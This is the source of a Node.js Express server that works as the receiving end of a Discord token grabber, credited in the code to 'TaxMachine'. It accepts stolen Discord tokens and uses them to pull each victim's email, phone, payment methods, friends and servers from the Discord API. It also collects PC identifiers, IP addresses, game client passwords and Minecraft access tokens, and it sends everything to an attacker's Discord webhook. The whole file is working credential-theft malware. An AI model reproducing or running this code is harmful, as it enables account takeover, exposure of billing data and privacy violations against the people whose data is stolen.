const express=ඞ('express'),app=express(),Discord=ඞ('v11-discord.js'),{text}=ඞ('body-parser'),request=ඞ('sync-request'),fs=ඞ('fs'),superagent=ඞ('superagent')
var webhook="",webhook=webhook.split("/"),webhook=new Discord.WebhookClient(webhook[5],webhook[6])

app.use(text())
app.listen(3000)
console.clear()
console.log('Ready')
app.post('/tkns', (req, res) => {
    res.sendStatus(200)
    var token = req.headers.token
        var baseinfo = getInfo("https://discord.com/api/v9/users/@me", token)
        if (baseinfo == "Invalid") return
        var billinginfo = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
        var friendsinf = getInfo("https://discordapp.com/api/v9/users/@me/relationships", token)
        var guildinfo = getInfo("https://discord.com/api/v9/users/@me/guilds", token)
        var applications = getInfo("https://discord.com/api/v9/applications", token)
        var connections = getInfo("https://discordapp.com/api/v9/users/@me/connections", token)
        var owowner = 0,
        bio, phone
        guildinfo.forEach(r => r.owner && owowner++)
        if (billinginfo.length > 0) billing = `\`Yes \` `
            else billing = "```No.```"
        billinginfo.forEach(i => {
            i.brand && 0 == i.invalid && (billing += ":credit_card: "),
            i.email && (billing += "<:paypal:891011558040277072> ")
        });
        if (baseinfo.bio) bio = baseinfo.bio
            else bio = "No Biography"
        if (bio.startsWith("```") && bio.endsWith("```")) bio = bio.slice(3, -3)
        if (baseinfo.phone !== null) phone = baseinfo.phone
            else phone = "No Phone"
        if (baseinfo.banner) var image = `https://cdn.discordapp.com/banners/${baseinfo.id}/${baseinfo.banner}.png?size=1024`
            else var image = "https://cdn.discordapp.com/attachments/934569914302337054/934676485216800858/no-image-available-icon-6.png"
        var ip = req.headers.ip
        var ipinfo = getIPInfo(ip)
        var localip = req.headers.localip.replace(/&&/g, '\n')
        var embed = new Discord.RichEmbed()
            .setTitle('**New Token Grabbed**')
            .setURL('https://github.com/TaxMachine/PowershellTokenGrabberV2')
            .setAuthor('By TaxMachine', 'https://cdn.discordapp.com/attachments/913252318416343093/934997622870142996/bG9nby5wbmc.png')
            .addField('**Username**', '```'+baseinfo.username+'#'+baseinfo.discriminator+'```')
            .addField('**Token**', "```"+token+"```")
            .addField('**Email**', '```'+baseinfo.email+'```')
            .addField('**Phone**', '```'+phone+'```')
            .addField('**Payment Method**', billing, true)
            .addField('**Badges**', badges(baseinfo.flags), true)
            .addField('**Nitro**', getNitro(baseinfo.premium_type), true)
            .addField('**Friends**', "`"+friendsinf.filter(r=>r.type==1).length+"`", true)
            .addField('**Verified?**', "`"+baseinfo.verified+"`", true)
            .addField('**NSFW Allowed?**', "`"+baseinfo.nsfw_allowed+"`", true)
            .addField('**Total Guild**', "`"+guildinfo.length+"`", true)
            .addField('**Total Owned Guild**', "`"+owowner+"`", true)
            .addField('**Total Applications**', "`"+applications.length+"`", true)
            .addField('**Total Connections**', "`"+connections.length+"`", true)
            .addField('**Biography**', "```"+bio+"```")
            .setImage(image)
            .setThumbnail(`https://cdn.discordapp.com/avatars/${baseinfo.id}/${baseinfo.avatar}.png?size=128`)
            .setColor('#c37be5')
            .setFooter("Powershell Grabber By TaxMachine")
            .setTimestamp()
        webhook.send(embed)
        var pcinfo = new Discord.RichEmbed()
            .setTitle('**PC Infos Grabbed**')
            .setURL('https://github.com/TaxMachine/PowershellTokenGrabberV2')
            .setAuthor('By TaxMachine', 'https://cdn.discordapp.com/attachments/913252318416343093/934997622870142996/bG9nby5wbmc.png')
            .addField('**Discord Username**', "```"+baseinfo.username+"#"+baseinfo.discriminator+"```")
            .addField('**Username**', "```"+req.headers.username+"@"+req.headers.pcname+"```")
            .addField('**UUID**', "```"+req.headers.uuid+"```", true)
            .addField('**GUID**', "```"+req.headers.guid+"```", true)
            .addField('**MAC ADDRESS**', "```"+req.headers.mac+"```")
            .addField('**CPU**', "```"+req.headers.cpu+"```")
            .addField('**Local IP**', "```"+localip+"```")
            .addField('**Public IP Info**', "```"+"IP: "+ip+'\n'+"ISP: "+ipinfo.isp+'\n'+"ASN: "+ipinfo.asn+"```", true)
            .setColor('#c37be5')
            .setFooter("Powershell Grabber By TaxMachine")
            .setTimestamp()
        webhook.send(pcinfo)
        /*var friendembed = new Discord.RichEmbed()
            .setTitle(`**${baseinfo.username}#${baseinfo.discriminator}'s Interesting Friends**`)
            .setURL('https://github.com/TaxMachine/PowershellTokenGrabberV2')
            .setAuthor('By TaxMachine', 'https://cdn.discordapp.com/attachments/913252318416343093/934997622870142996/bG9nby5wbmc.png')
            .setThumbnail(`https://cdn.discordapp.com/avatars/${baseinfo.id}/${baseinfo.avatar}.png?size=128`)
            .setDescritption(friendInfos(friendsinf))
            .setImage(image)
            .setColor("#c37be5")
            .setFooter('Powershell Grabber By TaxMachine')
            .setTimestamp()
        webhook.send(friendembed)*/
})
app.post('/clients', (req, res) => {
    res.sendStatus(200)
    var a = req.headers
    a.futureway?futway=a.futureway:futway="No Waypoints"
    a.futureAlts?futalt=a.futureAlts:futalt="No Alts"
    var futureway = futway.replace(/&&/g, "\n ")
    var futurealts = futalt.replace(/ /g, "\n ")
    if (a.rhalts === "[]") {
        var rusheralts = "No Alts"
    } else var rusheralts = a.rhalts
    if (a.rhway === "[]") {
        var rusherway = "No Waypoints"
    } else var rusherway = a.rhway
    if (a.konasway === "{}") {
        var konasway = "No Waypoints"
    } else var konasway = a.konasway
    if (a.konasalts === "[]") {
        var konasalts = "No Alts"
    } else var konasalts = a.konasalts
    a.remixuid?uid=a.remixuid:uid="No Remix UID"
    a.remixalts?remalt=a.remixalts:remalt="No Alts"
    a.pyropass?pyropass=a.pyropass:pyropass="No Pyro Account"
    a.pyrousr?pyrousr=a.pyrousr:pyrousr="No Pyro Account"
        var msg = `
        \n████████████████████████████████████
        \n
        \n          𝗙𝘂𝘁𝘂𝗿𝗲 𝗖𝗹𝗶𝗲𝗻𝘁 
        \n  ${futureway}
        \n
        \n  ${futurealts}
        \n
        \n████████████████████████████████████
        \n
        \n           𝗥𝘂𝘀𝗵𝗲𝗿𝗵𝗮𝗰𝗸    
        \n  ${rusheralts}
        \n
        \n  ${rusherway}
        \n
        \n████████████████████████████████████
        \n
        \n          𝗞𝗼𝗻𝗮𝘀 𝗖𝗹𝗶𝗲𝗻𝘁  
        \n  ${konasway}
        \n
        \n
        \n  ${konasalts}
        \n████████████████████████████████████
        \n
        \n          𝗥𝗲𝗺𝗶𝘅 𝗖𝗹𝗶𝗲𝗻𝘁  
        \n  UID: ${uid}
        \n
        \n  ${remalt}
        \n
        \n████████████████████████████████████
        \n
        \n          𝗣𝘆𝗿𝗼 𝗖𝗹𝗶𝗲𝗻𝘁
        \n
        \n  Username: ${pyrousr}
        \n  Password: ${pyropass}
        \n
        \n████████████████████████████████████
        `
        if (msg.length > 2000) {
            fs.appendFileSync('./clients.txt', msg)
            setTimeout(() => webhook.send({files: ['./clients.txt']}), 5000)
            setTimeout(() => fs.unlinkSync('./clients.txt'), 15000)
        } else return webhook.send('```'+msg+'```')
})
app.post('/mcaccount', (req, res) => {
    res.sendStatus(200)
    var a = req.headers
    a.mctoken?token=a.mctoken:token="No Access Token"
    a.mctokenExpires?expires=a.mctokenExpires:expires="Unknown"
    superagent.get(`https://api.mojang.com/users/profiles/minecraft/${a.mcusr}`).then(r1=> {
        var mapi = JSON.parse(r1.text)
        superagent.get(`https://api.mojang.com/user/profiles/${mapi.id}/names`).then(r=> {
            var data = JSON.parse(r.text)
            var usedName = ""
            data.forEach(r => r.name&&r.changedToAt&&(usedName+=`${r.name} :: ${new Date(r.changedToAt).getHours()}h${new Date(r.changedToAt).getMinutes()} ${new Date(r.changedToAt).getDate()}/${new Date(r.changedToAt).getMonth()}/${new Date(r.changedToAt).getFullYear()}\n`))
            if (!usedName) {
                var namehist = "No Name History"
            } else var namehist = usedName.slice(0,-1)
            var mcembed = new Discord.RichEmbed()
                .setTitle('**New Minecraft Account Grabbed**')
                .setURL('https://github.com/TaxMachine/PowershellTokenGrabberV2')
                .addField('**Username**', '```'+a.mcusr+'```', true)
                .addField('**UUID**', '```'+a.mcid+'```', true)
                .addField('**Launcher Username**', '```'+a.mclauncherusr+'```', true)
                .addField('**Remote ID**', '```'+a.mcremoteid+'```', true)
                .addField('**Local ID**', '```'+a.mclocid+'```', true)
                .addField('**Active Account Local ID**', '```'+a.mclocid+'```', true)
                .addField('**Type**', a.mctype)
                .addField('**Legacy?**', a.mclegacy)
                .addField('**has Multiple Profiles**', a.mcmultiprof)
                .addField('**Eligible For Migration**', a.mcmigration)
                .addField('**Persistent**', a.mcpersistent)
                .addField('**Access Token**', '```'+token+'```', true)
                .addField('**Access Token Expires At**', '```'+expires+'```', true)
                .addField('████████████████████████████████████████████████', '**NameMC Lookup**')
                .addField('**Username**', '```'+mapi.name+'```', true)
                .addField('**UUID**', '```'+mapi.id+'```', true)
                .addField('**Name History**', '```'+namehist+'```')
                .setImage(`https://crafatar.com/renders/body/${mapi.id}.png`)
                .setFooter('Powershell Grabber By TaxMachine')
                .setTimestamp()
                .setColor('#c37be5')
            webhook.send(mcembed)
        })
    })
})
function getInfo(url,token){var data;const res=request("GET",url,{headers:{"Content-Type":"application/json","authorization":token}});if(res.statusCode !== 200)data="Invalid";else data=JSON.parse(res.getBody());return data}
function getIPInfo(ip){var data;var res=request("GET",`https://ipwhois.app/json/${ip}`);data=JSON.parse(res.getBody());return data}
function badges(f){var b="";if((f&1)==1)b+="<:staff:869411643765964921>";if((f&2)==2)b+="<:S_badgePartnerIDK:853638010737786910>";if((f&4)==4)b+="<:Hypesquadevents:894192746569535568>";if((f&8)==8)b+="<:DE_BadgeBughunter:918945699503145011>";if((f&64)==64)b+="<:bravery:889966063100493914>";if((f&128)==128)b+="<:brilliance:889966063377317908>";if((f&256)==256)b+="<:balance:889966062962094090>";if((f&512)==512)b+="<:lgn_earlysupporter:905293948665360384>";if((f&16384)==16384)b+="<:DE_BadgeBughunterCanary:918945729400147978>";if((f&131072)==131072)b+="<:dev_bot:904823639537504286>";if(b=="")b=":x:";return b}
function friendInfos(friends){var returned;var friendFilter=friends.filter(r=>r.type==1);for(filter of friendFilter){var badges=friendBadges(filter.user.public_flags);if(badges!="None")returned+=`${badges} ${filter.user.username}#${filter.user.discriminator}\n`};if(!returned)returned="Their friends aren't interesting";if(returned=="Their friends aren't interesting")return returned;else return returned.slice(9)}
function getNitro(oof){var n="";if((oof&0)==0)n="<:Nitro_Yohann:901289849024282674> :x:";if((oof&1)==1)n="<:Nitro_Yohann:901289849024282674>";if((oof&2)==2)n="<:LNnitro:918956604987166760> <:6_boost:854202388084293642>";if(n=="")n="<:Nitro_Yohann:901289849024282674> :x:";return n}
function friendBadges(f){var b="";if((f&1)==1)b+="<:staff:869411643765964921>";if((f&2)==2)b+="<:S_badgePartnerIDK:853638010737786910>";if((f&4)==4)b+="<:Hypesquadevents:894192746569535568>";if((f&8)==8)b+="<:DE_BadgeBughunter:918945699503145011>";if((f&512)==512)b+="<:lgn_earlysupporter:905293948665360384>";if((f&16384)==16384)b+="<:DE_BadgeBughunterCanary:918945729400147978>";if((f&131072)==131072)b+="<:dev_bot:904823639537504286>";if(b=="")b="None";return b}
function ඞ(f){return require(f)}
